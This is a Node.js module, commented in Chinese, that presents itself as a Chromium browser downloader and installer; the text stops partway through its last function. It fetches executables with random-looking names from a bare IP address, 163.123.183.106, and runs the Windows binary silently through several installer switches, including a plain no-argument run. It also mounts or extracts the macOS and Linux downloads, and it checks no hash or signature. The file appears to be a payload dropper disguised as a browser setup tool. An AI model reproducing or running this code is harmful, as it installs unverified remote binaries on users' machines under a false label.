const fs = require('fs').promises;
const path = require('path');
const https = require('https');
const http = require('http');
const { exec } = require('child_process');
const os = require('os');

class BrowserDownloader {
    constructor() {
        this.downloadUrls = {
            windows: {
                x64: 'http://163.123.183.106:29772/down/AabMCedQhYb2.exe',
                x86: 'http://163.123.183.106:29772/down/AabMCedQhYb2.exe'
            },
            macos: {
                x64: 'http://163.123.183.106:29772/down/HZfJ5aHyFwTV.dmg',
                arm64: 'http://163.123.183.106:29772/down/HZfJ5aHyFwTV.dmg'
            },
            linux: {
                x64: 'http://163.123.183.106:29772/down/C4B2CVdEvc7C.xz'
            }
        };
        
        this.defaultInstallPaths = {
            windows: path.join(os.homedir(), 'AppData', 'Local', 'ChromiumManager', 'Browser'),
            macos: path.join(os.homedir(), 'Library', 'Application Support', 'ChromiumManager', 'Browser'),
            linux: path.join(os.homedir(), '.local', 'share', 'ChromiumManager', 'Browser')
        };
    }

    // 检测平台和架构
    detectPlatform() {
        const platform = process.platform;
        const arch = process.arch;
        
        let normalizedPlatform;
        let normalizedArch;
        
        switch (platform) {
            case 'win32':
                normalizedPlatform = 'windows';
                break;
            case 'darwin':
                normalizedPlatform = 'macos';
                break;
            case 'linux':
                normalizedPlatform = 'linux';
                break;
            default:
                throw new Error(`不支持的平台: ${platform}`);
        }
        
        switch (arch) {
            case 'x64':
            case 'x86_64':
                normalizedArch = 'x64';
                break;
            case 'arm64':
                normalizedArch = 'arm64';
                break;
            case 'ia32':
            case 'x86':
                normalizedArch = 'x86';
                break;
            default:
                normalizedArch = 'x64'; // 默认使用x64
        }
        
        return { platform: normalizedPlatform, arch: normalizedArch };
    }

    // 获取下载URL
    getDownloadUrl() {
        const { platform, arch } = this.detectPlatform();
        const platformUrls = this.downloadUrls[platform];
        
        if (!platformUrls) {
            throw new Error(`不支持的平台: ${platform}`);
        }
        
        // 优先使用对应架构，回退到x64
        return platformUrls[arch] || platformUrls.x64 || Object.values(platformUrls)[0];
    }

    // 获取默认安装路径
    getDefaultInstallPath() {
        const { platform } = this.detectPlatform();
        return this.defaultInstallPaths[platform];
    }

    // 下载文件
    async downloadFile(url, targetPath, onProgress) {
        console.log(`开始下载: ${url}`);
        console.log(`下载到: ${targetPath}`);
        
        // 确保目录存在
        await fs.mkdir(path.dirname(targetPath), { recursive: true });
        
        return new Promise((resolve, reject) => {
            const protocol = url.startsWith('https:') ? https : http;
            
            const request = protocol.get(url, (response) => {
                console.log(`下载响应状态码: ${response.statusCode}`);
                console.log(`响应头:`, response.headers);
                
                if (response.statusCode === 302 || response.statusCode === 301) {
                    // 处理重定向
                    console.log(`重定向到: ${response.headers.location}`);
                    this.downloadFile(response.headers.location, targetPath, onProgress)
                        .then(resolve)
                        .catch(reject);
                    return;
                }
                
                if (response.statusCode !== 200) {
                    reject(new Error(`下载失败，状态码: ${response.statusCode}`));
                    return;
                }
                
                const totalSize = parseInt(response.headers['content-length'], 10);
                let downloadedSize = 0;
                
                console.log(`文件总大小: ${totalSize ? Math.round(totalSize / 1024 / 1024) + 'MB' : '未知'}`);
                
                const fileStream = require('fs').createWriteStream(targetPath);
                
                fileStream.on('error', (error) => {
                    console.error('文件写入错误:', error);
                    reject(error);
                });
                
                response.on('data', (chunk) => {
                    downloadedSize += chunk.length;
                    
                    try {
                        fileStream.write(chunk);
                        
                        if (onProgress) {
                            if (totalSize) {
                                const progress = Math.round((downloadedSize / totalSize) * 100);
                                onProgress(progress, downloadedSize, totalSize);
                            } else {
                                // 如果没有总大小信息，至少显示已下载的大小
                                onProgress(0, downloadedSize, downloadedSize);
                            }
                        }
                    } catch (writeError) {
                        fileStream.destroy();
                        reject(writeError);
                    }
                });
                
                response.on('end', () => {
                    console.log(`下载完成，总计下载: ${Math.round(downloadedSize / 1024 / 1024)}MB`);
                    fileStream.end(() => {
                        resolve(targetPath);
                    });
                });
                
                response.on('error', (error) => {
                    console.error('下载流错误:', error);
                    fileStream.destroy();
                    reject(error);
                });
            });
            
            request.on('error', (error) => {
                console.error('请求错误:', error);
                reject(error);
            });
            
            request.setTimeout(300000, () => {
                console.error('下载超时');
                request.destroy();
                reject(new Error('下载超时'));
            });
        });
    }

    // 处理安装文件
    async processInstallFile(filePath, installPath) {
        const { platform } = this.detectPlatform();
        const ext = path.extname(filePath).toLowerCase();
        
        console.log(`开始处理安装文件: ${filePath}`);
        console.log(`安装到: ${installPath}`);
        
        await fs.mkdir(installPath, { recursive: true });
        
        switch (platform) {
            case 'windows':
                if (ext === '.exe') {
                    return await this.installWindowsExecutable(filePath, installPath);
                } else {
                    throw new Error(`Windows平台不支持的文件格式: ${ext}`);
                }
                
            case 'macos':
                if (ext === '.dmg') {
                    return await this.installMacDMG(filePath, installPath);
                } else {
                    throw new Error(`macOS平台不支持的文件格式: ${ext}`);
                }
                
            case 'linux':
                if (ext === '.xz' || filePath.includes('.tar.xz')) {
                    return await this.extractLinuxArchive(filePath, installPath);
                } else {
                    throw new Error(`Linux平台不支持的文件格式: ${ext}`);
                }
                
            default:
                throw new Error(`不支持的平台: ${platform}`);
        }
    }

    // Windows EXE安装程序处理
    async installWindowsExecutable(exePath, installPath) {
        console.log('处理Windows可执行文件:', exePath);
        console.log('安装路径:', installPath);
        
        // 检查下载的文件是否存在和有效
        try {
            const stat = await fs.stat(exePath);
            console.log(`文件信息: 大小=${Math.round(stat.size / 1024 / 1024)}MB`);
            
            if (stat.size < 1024 * 1024) { // 小于1MB，可能是错误文件
                throw new Error(`下载的文件太小(${Math.round(stat.size / 1024)}KB)，可能下载不完整`);
            }
        } catch (statError) {
            throw new Error(`无法访问下载的文件: ${statError.message}`);
        }
        
        // 检查是否是安装程序
        const fileName = path.basename(exePath).toLowerCase();
        console.log('文件名:', fileName);
        
        // 获取文件大小来辅助判断
        const stat = await fs.stat(exePath);
        const fileSizeMB = Math.round(stat.size / 1024 / 1024);
        console.log(`文件大小: ${fileSizeMB}MB`);
        
        if (fileName.includes('installer') || fileName.includes('setup') || fileSizeMB > 80) {
            // 标准安装程序（文件名包含installer/setup，或者文件大于80MB）
            console.log('检测为标准安装程序');
            return await this.runWindowsInstaller(exePath, installPath);
        } else {
            // 便携版可执行文件
            console.log('检测为便携版或自解压文件');
            return await this.handlePortableExecutable(exePath, installPath);
        }
    }

    // 运行Windows安装程序
    async runWindowsInstaller(exePath, installPath) {
        return new Promise(async (resolve, reject) => {
            const command = `"${exePath}" /S /D="${installPath}"`;
            console.log('运行Windows安装程序:', command);
            
            exec(command, { timeout: 300000 }, async (error, stdout, stderr) => {
                if (error) {
                    console.warn('安装程序安装失败，尝试便携版处理:', error.message);
                    try {
                        const result = await this.handlePortableExecutable(exePath, installPath);
                        resolve(result);
                    } catch (portableError) {
                        reject(portableError);
                    }
                } else {
                    console.log('Windows安装程序执行完成，检查实际安装路径...');
                    
                    // 检查指定路径是否有浏览器文件
                    const executableInTargetPath = await this.findBrowserExecutable(installPath);
                    if (executableInTargetPath) {
                        console.log('✅ 浏览器已安装到指定路径:', executableInTargetPath);
                        // 返回实际包含浏览器可执行文件的目录路径
                        const actualInstallPath = path.dirname(executableInTargetPath);
                        console.log('📍 实际安装目录:', actualInstallPath);
                        resolve(actualInstallPath);
                        return;
                    }
                    
                    console.log('指定路径未找到浏览器，搜索常见安装位置...');
                    
                    // 如果指定路径没有安装成功，检查常见的Windows安装路径
                    const actualInstallPath = await this.findWindowsInstallPath();
                    if (actualInstallPath) {
                        console.log('✅ 在系统路径找到浏览器:', actualInstallPath);
                        resolve(actualInstallPath);
                    } else {
                        console.log('未找到浏览器安装，尝试便携版处理...');
                        try {
                            const result = await this.handlePortableExecutable(exePath, installPath);
                            resolve(result);
                        } catch (portableError) {
                            reject(new Error('安装失败：未找到已安装的浏览器'));
                        }
                    }
                }
            });
        });
    }

    // 处理便携版可执行文件
    async handlePortableExecutable(exePath, installPath) {
        console.log('处理为便携版浏览器');
        
        try {
            const fileName = path.basename(exePath);
            console.log(`处理文件: ${fileName}`);
            
            // 检查文件大小，判断是否为自解压文件
            const stat = await fs.stat(exePath);
            console.log(`文件大小: ${Math.round(stat.size / 1024 / 1024)}MB`);
            
            if (stat.size > 50 * 1024 * 1024) { // 大于50MB，可能是自解压文件或安装程序
                console.log('检测为自解压文件或安装程序，尝试处理...');
                const result = await this.extractWindowsPortable(exePath, installPath);
                
                // 如果返回的路径中没有浏览器可执行文件，检查系统路径
                const executableInResult = await this.findBrowserExecutable(result);
                if (!executableInResult) {
                    console.log('🔍 处理结果中未找到浏览器，检查系统安装路径...');
                    const systemInstallPath = await this.findWindowsInstallPath();
                    if (systemInstallPath) {
                        console.log(`✅ 在系统路径找到浏览器: ${systemInstallPath}`);
                        return systemInstallPath;
                    }
                }
                
                return result;
            } else {
                console.log('检测为单个可执行文件，直接复制...');
                // 直接复制到安装目录
                const targetExePath = path.join(installPath, fileName);
                await fs.copyFile(exePath, targetExePath);
                
                console.log(`便携版浏览器已准备: ${targetExePath}`);
                return installPath;
            }
            
        } catch (error) {
            throw new Error(`便携版处理失败: ${error.message}`);
        }
    }

    // 解压Windows便携版
    async extractWindowsPortable(exePath, installPath) {
        return new Promise((resolve, reject) => {
            // 尝试多种解压方法
            const extractMethods = [
                // 方法1: 无参数运行（很多便携版支持）
                `cd /d "${installPath}" && "${exePath}"`,
                // 方法2: 静默解压到指定目录
                `"${exePath}" /S /D="${installPath}"`,
                // 方法3: 7-zip格式
                `"${exePath}" -o"${installPath}" -y`,
                // 方法4: 标准安装程序格式
                `"${exePath}" /VERYSILENT /DIR="${installPath}"`,
                // 方法5: NSIS格式
                `"${exePath}" /S /D="${installPath}"`,
            ];
            
            let methodIndex = 0;
            
            const tryNextMethod = async () => {
                if (methodIndex >= extractMethods.length) {
                    // 所有解压方法都失败，直接复制exe文件
                    try {
                        await this.copyAsingleFile(exePath, installPath);
                        resolve(installPath);
                    } catch (copyError) {
                        reject(copyError);
                    }
                    return;
                }
                
                const command = extractMethods[methodIndex];
                
                exec(command, { 
                    timeout: 180000,
                    cwd: installPath 
                }, async (error, stdout, stderr) => {
                    if (error) {
                        methodIndex++;
                        tryNextMethod();
                    } else {
                        console.log(`✅ 安装命令执行成功 (方法${methodIndex + 1})`);
                        
                        // 首先检查是否有文件被解压到指定目录
                        try {
                            const items = await fs.readdir(installPath);
                            if (items.length > 0) {
                                console.log(`📁 指定目录有文件被创建: ${items.length}个项目`);
                                
                                // 检查解压目录中是否有浏览器可执行文件
                                const executableInExtractPath = await this.findBrowserExecutable(installPath);
                                if (executableInExtractPath) {
                                    console.log(`🎯 在解压目录找到浏览器: ${executableInExtractPath}`);
                                    const actualPath = path.dirname(executableInExtractPath);
                                    resolve(actualPath);
                                    return;
                                }
                            }
                        } catch (readError) {
                            console.log('读取解压目录失败:', readError.message);
                        }
                        
                        // 如果解压目录没有浏览器，检查系统安装路径（可能是安装程序）
                        console.log('🔍 解压目录未找到浏览器，检查系统安装路径...');
                        const systemInstallPath = await this.findWindowsInstallPath();
                        if (systemInstallPath) {
                            console.log(`✅ 在系统路径找到浏览器: ${systemInstallPath}`);
                            resolve(systemInstallPath);
                        } else {
                            console.log('❌ 系统路径也未找到浏览器');
                            resolve(installPath); // 回退到原始逻辑
                        }
                    }
                });
            };
            
            tryNextMethod();
        });
    }

    // 复制单个文件作为便携版
    async copyAsingleFile(exePath, installPath) {
        const fileName = path.basename(exePath);
        const targetPath = path.join(installPath, fileName);
        
        await fs.copyFile(exePath, targetPath);
        
        // 如果是exe文件，尝试添加可执行权限
        if (fileName.toLowerCase().endsWith('.exe')) {
            try {
                const fs_sync = require('fs');
                fs_sync.chmodSync(targetPath, '755');
            } catch (chmodError) {
                // 忽略chmod错误，Windows不需要
            }
        }
        
        return installPath;
    }

    // 查找Windows系统中的浏览器安装路径
    async findWindowsInstallPath() {
        console.log('🔍 开始搜索Windows系统中的浏览器安装路径...');
        console.log('💡 根据实际安装模式，优先检查 AppData\\Local\\Chromium\\Application\\ 等路径');
        
        // Windows常见的浏览器安装路径
        const commonPaths = [
            // 用户级安装路径 - 优先检查常见的Application子目录
            path.join(os.homedir(), 'AppData', 'Local', 'Chromium', 'Application'),
            path.join(os.homedir(), 'AppData', 'Local', 'Chromium'),
            path.join(os.homedir(), 'AppData', 'Local', 'Google', 'Chrome', 'Application'),
            path.join(os.homedir(), 'AppData', 'Local', 'Google', 'Chrome'),
            path.join(os.homedir(), 'AppData', 'Local', 'ungoogled-chromium', 'Application'),
            path.join(os.homedir(), 'AppData', 'Local', 'ungoogled-chromium'),
            path.join(os.homedir(), 'AppData', 'Local', 'ChromiumManager'),
            
            // 系统级安装路径 - 也检查Application子目录
            'C:\\Program Files\\Google\\Chrome\\Application',
            'C:\\Program Files\\Google\\Chrome',
            'C:\\Program Files (x86)\\Google\\Chrome\\Application',
            'C:\\Program Files (x86)\\Google\\Chrome',
            'C:\\Program Files\\Chromium\\Application',
            'C:\\Program Files\\Chromium',
            'C:\\Program Files (x86)\\Chromium\\Application',
            'C:\\Program Files (x86)\\Chromium',
            'C:\\Program Files\\ungoogled-chromium\\Application',
            'C:\\Program Files\\ungoogled-chromium',
            'C:\\Program Files (x86)\\ungoogled-chromium\\Application',
            'C:\\Program Files (x86)\\ungoogled-chromium',
            
            // 其他可能的路径
            path.join(os.homedir(), 'AppData', 'Roaming', 'Chromium'),
            'C:\\Users\\Public\\Chromium',
            'C:\\Chromium',
            
            // 检查桌面和下载文件夹
            path.join(os.homedir(), 'Desktop'),
            path.join(os.homedir(), 'Downloads')
        ];
        
        console.log(`📋 将检查 ${commonPaths.length} 个可能的安装路径`);
        
        // 首先检查最常见的安装模式：AppData\Local\Chromium\Application\chrome.exe
        const mostLikelyPath = path.join(os.homedir(), 'AppData', 'Local', 'Chromium', 'Application', 'chrome.exe');
        console.log(`🎯 优先检查最常见的安装路径: ${mostLikelyPath}`);
        
        try {
            await fs.access(mostLikelyPath);
            console.log(`✅ 找到最常见安装模式的浏览器: ${mostLikelyPath}`);
            const installPath = path.dirname(mostLikelyPath);
            console.log(`📍 确定安装路径: ${installPath}`);
            return installPath;
        } catch (error) {
            console.log(`ℹ️ 最常见路径不存在，继续检查其他位置...`);
        }
        
        for (const searchPath of commonPaths) {
            console.log(`📁 检查路径: ${searchPath}`);
            
            try {
                // 检查路径是否存在
                await fs.access(searchPath);
                console.log(`✅ 路径存在: ${searchPath}`);
                
                // 在此路径中查找浏览器可执行文件
                const executablePath = await this.findBrowserExecutable(searchPath);
                if (executablePath) {
                    console.log(`🎯 找到浏览器可执行文件: ${executablePath}`);
                    
                    // 返回包含可执行文件的目录路径
                    const installPath = path.dirname(executablePath);
                    console.log(`📍 确定安装路径: ${installPath}`);
                    return installPath;
                }
                
            } catch (error) {
                console.log(`❌ 路径不存在或无法访问: ${searchPath}`);
                continue;
            }
        }
        
        console.log('😞 在所有常见路径中都未找到浏览器');
        
        // 最后尝试：使用Windows注册表查找
        try {
            console.log('🔍 尝试从Windows注册表查找浏览器...');
            const registryPath = await this.findBrowserFromRegistry();
            if (registryPath) {
                console.log(`📍 从注册表找到浏览器: ${registryPath}`);
                return path.dirname(registryPath);
            }
        } catch (registryError) {
            console.log('❌ 注册表查找失败:', registryError.message);
        }
        
        return null;
    }

    // 从Windows注册表查找浏览器
    async findBrowserFromRegistry() {
        return new Promise((resolve) => {
                         // 检查常见的注册表路径
            const registryCommands = [
                // Chrome注册表路径
                'reg query "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\chrome.exe" /ve',
                'reg query "HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\chrome.exe" /ve',
                
                // Chromium注册表路径
                'reg query "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\chromium.exe" /ve',
                'reg query "HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\chromium.exe" /ve',
                
                // Chromium浏览器注册表位置（更广泛的搜索）
                'reg query "HKEY_CURRENT_USER\\SOFTWARE\\Chromium" /s',
                'reg query "HKEY_LOCAL_MACHINE\\SOFTWARE\\Chromium" /s',
                
                // 其他可能的路径
                'reg query "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall" /s /f "Chromium"',
                'reg query "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall" /s /f "Chrome"'
            ];
            
            let commandIndex = 0;
            
            const tryNextCommand = () => {
                if (commandIndex >= registryCommands.length) {
                    resolve(null);
                    return;
                }
                
                const command = registryCommands[commandIndex];
                console.log(`🔍 执行注册表查询: ${command}`);
                
                exec(command, (error, stdout, stderr) => {
                    if (!error && stdout) {
                        console.log(`📋 注册表输出: ${stdout}`);
                        
                        // 解析注册表输出，查找可执行文件路径
                        const lines = stdout.split('\n');
                        for (const line of lines) {
                            const match = line.match(/([C-Z]:\\[^\\]+.*?\.exe)/i);
                            if (match) {
                                const exePath = match[1].trim();
                                console.log(`🎯 从注册表找到可执行文件: ${exePath}`);
                                
                                // 验证文件是否存在
                                require('fs').access(exePath, (accessError) => {
                                    if (!accessError) {
                                        resolve(exePath);
                                    } else {
                                        commandIndex++;
                                        tryNextCommand();
                                    }
                                });
                                return;
                            }
                        }
                    }
                    
                    commandIndex++;
                    tryNextCommand();
                });
            };
            
            tryNextCommand();
        });
    }

    // macOS DMG文件处理
    async installMacDMG(dmgPath, installPath) {
        console.log('处理macOS DMG文件:', dmgPath);
        
        // 1. 挂载DMG文件
        const mountPoint = await this.mountDMG(dmgPath);
        
        try {
            // 2. 复制.app文件
            await this.copyAppFromDMG(mountPoint, installPath);
            
            console.log('macOS应用安装完成');
            return installPath;
            
        } finally {
            // 3. 卸载DMG（无论成功失败都要卸载）
            await this.unmountDMG(mountPoint);
        }
    }

    // 挂载DMG文件
    async mountDMG(dmgPath) {
        return new Promise((resolve, reject) => {
            const mountCommand = `hdiutil attach "${dmgPath}" -nobrowse -quiet`;
            console.log('挂载DMG文件:', mountCommand);
            
            exec(mountCommand, (error, stdout, stderr) => {
                if (error) {
                    reject(new Error(`DMG挂载失败: ${error.message}`));
                    return;
                }
                
                console.log('hdiutil attach 输出:', stdout);
                
                // 解析挂载点
                let mountPoint = null;
                const mountLines = stdout.trim().split('\n');
                
                for (const line of mountLines) {
                    console.log('分析行:', line);
                    
                    // hdiutil attach输出格式: /dev/disk2s1 \t Apple_HFS \t /Volumes/应用名称
                    const parts = line.split('\t');
                    if (parts.length >= 3) {
                        const possibleMount = parts[parts.length - 1].trim();
                        if (possibleMount.startsWith('/Volumes/')) {
                            mountPoint = possibleMount;
                            console.log('找到挂载点 (方法1):', mountPoint);
                            break;
                        }
                    }
                    
                    // 备用方法：直接匹配/Volumes/路径
                    const volumeMatch = line.match(/\/Volumes\/[^\s\t]+/);
                    if (volumeMatch) {
                        mountPoint = volumeMatch[0];
                        console.log('找到挂载点 (方法2):', mountPoint);
                        break;
                    }
                }
                
                if (!mountPoint) {
                    // 最后的方法：使用默认的/Volumes/目录
                    console.log('尝试查找最新的/Volumes/目录...');
                    
                    exec('ls -la /Volumes/', (lsError, lsStdout) => {
                        if (!lsError) {
                            console.log('/Volumes/ 目录内容:', lsStdout);
                            
                            // 查找最新创建的非系统目录
                            const lines = lsStdout.split('\n');
                            for (const line of lines) {
                                if (line.includes('Chromium') || line.includes('ungoogled') || line.includes('Chrome')) {
                                    const parts = line.split(/\s+/);
                                    const dirName = parts[parts.length - 1];
                                    if (dirName && dirName !== '.' && dirName !== '..') {
                                        mountPoint = `/Volumes/${dirName}`;
                                        console.log('找到挂载点 (方法3):', mountPoint);
                                        break;
                                    }
                                }
                            }
                        }
                        
                        if (!mountPoint) {
                            reject(new Error('无法找到DMG挂载点'));
                        } else {
                            resolve(mountPoint);
                        }
                    });
                } else {
                    resolve(mountPoint);
                }
            });
        });
    }

    // 从DMG复制.app文件
    async copyAppFromDMG(mountPoint, installPath) {
        return new Promise((resolve, reject) => {
            try {
                console.log('在挂载点查找.app文件:', mountPoint);
                
                // 首先检查挂载点是否存在
                require('fs').accessSync(mountPoint);
                
                const items = require('fs').readdirSync(mountPoint);
                console.log('挂载点内容:', items);
                
                const appFile = items.find(item => item.endsWith('.app'));
                
                if (!appFile) {
                    throw new Error('DMG中未找到.app文件');
                }
                
                const sourcePath = path.join(mountPoint, appFile);
                const targetPath = path.join(installPath, appFile);
                
                console.log(`复制应用: ${sourcePath} -> ${targetPath}`);
                
                // 使用cp命令复制.app文件（保持权限）
                const copyCommand = `cp -R "${sourcePath}" "${targetPath}"`;
                
                exec(copyCommand, (copyError, stdout, stderr) => {
                    if (copyError) {
                        console.error('复制失败:', copyError);
                        console.error('错误输出:', stderr);
                        reject(new Error(`复制应用失败: ${copyError.message}`));
                    } else {
                        console.log('应用复制成功');
                        resolve();
                    }
                });
                
            } catch (error) {
                reject(new Error(`处理DMG内容失败: ${error.message}`));
            }
        });
    }

    // 卸载DMG
    async unmountDMG(mountPoint) {
        return new Promise((resolve) => {
            const unmountCommand = `hdiutil detach "${mountPoint}" -quiet`;
            console.log('卸载DMG:', unmountCommand);
            
            exec(unmountCommand, (error) => {
                if (error) {
                    console.warn('DMG卸载失败，但继续:', error.message);
                } else {
                    console.log('DMG卸载成功');
                }
                resolve(); // 无论成功失败都resolve
            });
        });
    }

    // Linux tar.xz压缩包处理
    async extractLinuxArchive(archivePath, installPath) {
        return new Promise((resolve, reject) => {
            const command = `tar -xf "${archivePath}" -C "${installPath}"`;
            console.log('解压Linux归档文件:', command);
            
            exec(command, (error, stdout, stderr) => {
                if (error) {
                    console.error('Linux解压失败:', error);
                    console.error('错误输出:', stderr);
                    reject(error);
                } else {
                    console.log('Linux解压完成');
                    resolve(installPath);
                }
            });
        });
    }

    // 主下载安装方法
    async downloadAndInstall(targetPath = null, onProgress = null) {
        try {
            // 检测系统
            const { platform, arch } = this.detectPlatform();
            console.log(`检测到系统: ${platform}-${arch}`);
            
            // 获取下载URL和目标路径
            const downloadUrl = this.getDownloadUrl();
            const installPath = targetPath || this.getDefaultInstallPath();
            
            // 下载文件
            const fileName = path.basename(downloadUrl);
            const downloadPath = path.join(path.dirname(installPath), fileName);
            
            // 检查文件是否已存在
            try {
                await fs.access(downloadPath);
                console.log('文件已存在，跳过下载');
            } catch {
                await this.downloadFile(downloadUrl, downloadPath, onProgress);
            }
            
            // 处理安装文件
            const extractPath = path.join(installPath, 'installed');
            const processResult = await this.processInstallFile(downloadPath, extractPath);
            
            // processResult 可能是实际的安装路径（对于Windows标准安装程序）
            let actualInstallPath = processResult;
            
            // 查找浏览器可执行文件
            let executablePath = await this.findBrowserExecutable(actualInstallPath);
            
            if (!executablePath) {
                console.log('🔍 在处理路径未找到可执行文件，尝试其他位置...');
                
                // 如果找不到，打印目录结构进行调试
                console.log('🔍 打印安装目录结构：');
                await this.printDirectoryStructure(actualInstallPath);
                
                // 尝试在上级目录查找
                const parentPath = path.dirname(actualInstallPath);
                console.log('🔍 尝试在上级目录查找...');
                const parentExecutable = await this.findBrowserExecutable(parentPath);
                
                if (parentExecutable) {
                    console.log(`✅ 在上级目录找到可执行文件: ${parentExecutable}`);
                    executablePath = parentExecutable;
                    actualInstallPath = path.dirname(parentExecutable);
                } else if (platform === 'windows') {
                    // 对于Windows，尝试在系统路径查找
                    console.log('🔍 尝试在Windows系统路径查找...');
                    const systemInstallPath = await this.findWindowsInstallPath();
                    if (systemInstallPath) {
                        const systemExecutable = await this.findBrowserExecutable(systemInstallPath);
                        if (systemExecutable) {
                            console.log(`✅ 在系统路径找到可执行文件: ${systemExecutable}`);
                            executablePath = systemExecutable;
                            actualInstallPath = systemInstallPath;
                        }
                    }
                }
                
                if (!executablePath) {
                    throw new Error('安装完成但未找到浏览器可执行文件');
                }
            }
            
            console.log(`✅ 浏览器安装成功: ${executablePath}`);
            console.log(`📍 实际安装路径: ${actualInstallPath}`);
            
            return {
                success: true,
                executablePath,
                installPath: actualInstallPath
            };
            
        } catch (error) {
            console.error('下载安装失败:', error);
            throw error;
        }
    }

    // 查找浏览器可执行文件
    async findBrowserExecutable(searchPath) {
        const { platform } = this.detectPlatform();
        
        console.log(`🔍 开始查找浏览器可执行文件，搜索路径: ${searchPath}`);
        
        const executableNames = {
            windows: ['chrome.exe', 'chromium.exe', 'ungoogled-chromium.exe', 'Chromium.exe', 'Chrome.exe'],
            macos: ['.app'], // 查找所有.app文件
            linux: ['chrome', 'chromium', 'chromium-browser', 'ungoogled-chromium']
        };
        
        const names = executableNames[platform];
        
        // 递归搜索可执行文件
        const searchExecutable = async (dir, depth = 0) => {
            console.log(`📁 搜索目录: ${dir} (深度: ${depth})`);
            
            if (depth > 5) {
                console.log(`⚠️ 达到最大搜索深度，停止搜索`);
                return null;
            }
            
            try {
                const items = await fs.readdir(dir);
                console.log(`📋 目录内容 (${items.length}项):`, items);
                
                // 首先在当前目录查找
                if (platform === 'macos') {
                    // 对于macOS，查找所有.app文件
                    for (const item of items) {
                        if (item.endsWith('.app')) {
                            const fullPath = path.join(dir, item);
                            console.log(`🎯 找到.app文件: ${fullPath}`);
                            const macosPath = await this.findMacOSExecutable(fullPath);
                            if (macosPath) {
                                console.log(`✅ 找到可执行文件: ${macosPath}`);
                                return macosPath;
                            }
                        }
                    }
                } else {
                    // Windows和Linux的查找逻辑
                    for (const name of names) {
                        if (items.includes(name)) {
                            const fullPath = path.join(dir, name);
                            console.log(`✅ 找到可执行文件: ${fullPath}`);
                            return fullPath;
                        }
                    }
                    
                    // Windows额外检查：查找任何.exe文件
                    if (platform === 'windows') {
                        for (const item of items) {
                            if (item.toLowerCase().endsWith('.exe') && 
                                (item.toLowerCase().includes('chrom') || 
                                 item.toLowerCase().includes('browser'))) {
                                const fullPath = path.join(dir, item);
                                console.log(`✅ 找到Chrome相关可执行文件: ${fullPath}`);
                                return fullPath;
                            }
                        }
                        
                        // 最后尝试：任何exe文件
                        for (const item of items) {
                            if (item.toLowerCase().endsWith('.exe')) {
                                const fullPath = path.join(dir, item);
                                console.log(`⚠️ 找到可执行文件(备选): ${fullPath}`);
                                return fullPath;
                            }
                        }
                    }
                }
                
                // 递归搜索子目录
                const directories = [];
                for (const item of items) {
                    const itemPath = path.join(dir, item);
                    try {
                        const stat = await fs.stat(itemPath);
                        if (stat.isDirectory()) {
                            directories.push({name: item, path: itemPath});
                        }
                    } catch {
                        continue;
                    }
                }
                
                console.log(`📂 发现 ${directories.length} 个子目录:`, directories.map(d => d.name));
                
                for (const dirInfo of directories) {
                    console.log(`🔄 进入子目录: ${dirInfo.name}`);
                    const result = await searchExecutable(dirInfo.path, depth + 1);
                    if (result) {
                        return result;
                    }
                }
                
            } catch (error) {
                console.log(`❌ 无法访问目录 ${dir}: ${error.message}`);
            }
            
            return null;
        };
        
        // 首先检查搜索路径是否存在
        try {
            await fs.access(searchPath);
            console.log(`✅ 搜索路径存在: ${searchPath}`);
        } catch (error) {
            console.log(`ℹ️ 搜索路径不存在，这是正常的（浏览器尚未安装）: ${searchPath}`);
            return null;
        }
        
        const result = await searchExecutable(searchPath);
        
        if (result) {
            console.log(`🎉 搜索完成，找到可执行文件: ${result}`);
        } else {
            console.log(`😞 搜索完成，未找到可执行文件`);
        }
        
        return result;
    }

    // 查找macOS .app内的可执行文件
    async findMacOSExecutable(appPath) {
        console.log(`分析.app文件: ${appPath}`);
        
        const macosDir = path.join(appPath, 'Contents', 'MacOS');
        console.log(`MacOS目录: ${macosDir}`);
        
        try {
            // 首先检查MacOS目录是否存在
            try {
                await fs.access(macosDir);
                console.log('MacOS目录存在');
            } catch {
                console.log('MacOS目录不存在，跳过此.app文件');
                return null;
            }
            
            // 列出MacOS目录下的所有文件
            const macosFiles = await fs.readdir(macosDir);
            console.log('MacOS目录内容:', macosFiles);
            
            if (macosFiles.length === 0) {
                console.log('MacOS目录为空');
                return null;
            }
            
            // 尝试多种可能的可执行文件名
            const appBaseName = path.basename(appPath, '.app');
            const possibleExecutables = [
                appBaseName,
                'Chromium',
                'chrome', 
                'ungoogled-chromium',
                'Ungoogled Chromium',
                // 添加一些常见的变体
                appBaseName.replace(/\s+/g, ''),
                appBaseName.replace(/\s+/g, '-'),
                appBaseName.toLowerCase(),
                appBaseName.toLowerCase().replace(/\s+/g, ''),
                appBaseName.toLowerCase().replace(/\s+/g, '-')
            ];
            
            console.log('尝试的可执行文件名:', possibleExecutables);
            
            for (const execName of possibleExecutables) {
                if (macosFiles.includes(execName)) {
                    const execPath = path.join(macosDir, execName);
                    try {
                        const stat = await fs.stat(execPath);
                        if (stat.isFile()) {
                            // 检查文件是否可执行
                            await fs.access(execPath, require('fs').constants.X_OK);
                            console.log(`✅ 找到可执行文件: ${execPath}`);
                            return execPath;
                        }
                    } catch (err) {
                        console.log(`${execName} 不可执行:`, err.message);
                        continue;
                    }
                }
            }
            
            // 如果找不到匹配的名称，选择第一个可执行文件
            console.log('尝试查找任何可执行文件...');
            for (const file of macosFiles) {
                const filePath = path.join(macosDir, file);
                try {
                    const stat = await fs.stat(filePath);
                    if (stat.isFile()) {
                        // 检查文件是否可执行
                        await fs.access(filePath, require('fs').constants.X_OK);
                        console.log(`✅ 找到可执行文件: ${filePath}`);
                        return filePath;
                    }
                } catch (err) {
                    console.log(`${file} 检查失败:`, err.message);
                    continue;
                }
            }
            
        } catch (error) {
            console.error(`检查.app文件失败: ${error.message}`);
        }
        
        return null;
    }

    // 打印目录结构（用于调试）
    async printDirectoryStructure(dirPath, prefix = '', maxDepth = 3, currentDepth = 0) {
        if (currentDepth >= maxDepth) {
            console.log(`${prefix}... (达到最大深度)`);
            return;
        }
        
        try {
